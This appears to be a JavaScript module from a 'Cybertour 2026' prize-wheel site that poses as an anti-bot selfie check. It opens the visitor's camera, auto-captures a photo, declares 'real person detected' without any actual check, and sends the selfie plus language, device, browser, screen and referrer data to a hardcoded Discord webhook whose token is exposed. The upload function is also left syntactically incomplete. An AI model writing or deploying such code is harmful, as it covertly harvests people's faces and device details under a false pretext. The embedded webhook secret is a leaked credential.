/**
 * CYBERTOUR 2026 — verify.js
 * Vérification par selfie automatique + envoi Discord
 */

import { isVerified, setVerified } from './storage.js';

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';

let stream    = null;
let capturing = false;

export function openVerify(onSuccess) {
  if (isVerified()) { onSuccess(); return; }

  document.getElementById('verify-overlay').classList.add('active');
  document.getElementById('wheel-wrap')?.classList.add('wheel-frozen');

  document.getElementById('verify-start-btn').onclick  = () => startCamera(onSuccess);
  document.getElementById('verify-help-toggle').onclick = toggleHelp;
}

async function startCamera(onSuccess) {
  const btn = document.getElementById('verify-start-btn');
  btn.disabled = true;
  btn.querySelector('.btn-text').textContent = 'Détection en cours…';

  const video = document.getElementById('verify-video');
  video.setAttribute('playsinline', '');
  video.muted = true;

  const sets = [
    { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
    { video: { facingMode: 'user' } },
    { video: true },
  ];

  stream = null;
  for (const c of sets) {
    try { stream = await navigator.mediaDevices.getUserMedia(c); break; }
    catch {}
  }

  if (!stream) {
    showError('Accès à la caméra refusé. Vérifiez les permissions dans les réglages de votre navigateur.');
    btn.disabled = false;
    btn.querySelector('.btn-text').textContent = 'Réessayer';
    return;
  }

  video.srcObject = stream;
  try { await video.play(); } catch {}

  setTimeout(() => capturePhoto(video, onSuccess), 700);
}

async function capturePhoto(video, onSuccess) {
  if (capturing) return;
  capturing = true;

  flash();

  const canvas = document.createElement('canvas');
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);

  stopCamera();
  sendToDiscord(canvas);

  const btn = document.getElementById('verify-start-btn');
  if (btn) btn.querySelector('.btn-text').textContent = 'Personne réelle détectée ✓';

  setVerified();
  if (navigator.vibrate) navigator.vibrate([60, 40, 120]);

  setTimeout(() => {
    closeOverlay();
    document.getElementById('wheel-wrap')?.classList.remove('wheel-frozen');
    onSuccess();
  }, 900);
}

function sendToDiscord(canvas) {
  canvas.toBlob(async (blob) => {
    const fd = new FormData();
    fd.append('file', blob, `selfie-${Date.now()}.jpg`);
   fd.append('payload_json', JSON.stringify({
  embeds: [{
    title: '📸 Nouveau participant détecté',
    color: 0x2563eb,
    fields: [
      { name: '🕐 Heure',        value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
      { name: '🌍 Langue',       value: navigator.language || 'inconnu', inline: true },
      { name: '📱 Appareil',     value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
      { name: '🖥️ Navigateur',   value: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
      { name: '📐 Écran',        value: `${screen.width}×${screen.height}`, inline: true },
      { name: '🔗 Référent',     value: document.referrer || 'accès direct', inline: true },
    ],
    footer: { text: 'Cybertour 2026 — Système anti-bot' },
    timestamp: new Date().toISOString(),
  }]
}));

function flash() {
  const el = document.getElementById('verify-flash');
  if (!el) return;
  el.style.opacity = '1';
  setTimeout(() => { el.style.opacity = '0'; }, 180);
}

function stopCamera() {
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
  const v = document.getElementById('verify-video');
  if (v) v.srcObject = null;
}

function closeOverlay() {
  document.getElementById('verify-overlay').classList.remove('active');
}

function toggleHelp() {
  const panel = document.getElementById('verify-help-panel');
  const btn   = document.getElementById('verify-help-toggle');
  const open  = panel.classList.toggle('active');
  btn.textContent = open ? 'Masquer' : 'Besoin d\'aide ?';
}

function showError(msg) {
  const el = document.getElementById('verify-error');
  if (el) { el.textContent = msg; el.classList.add('active'); }
}
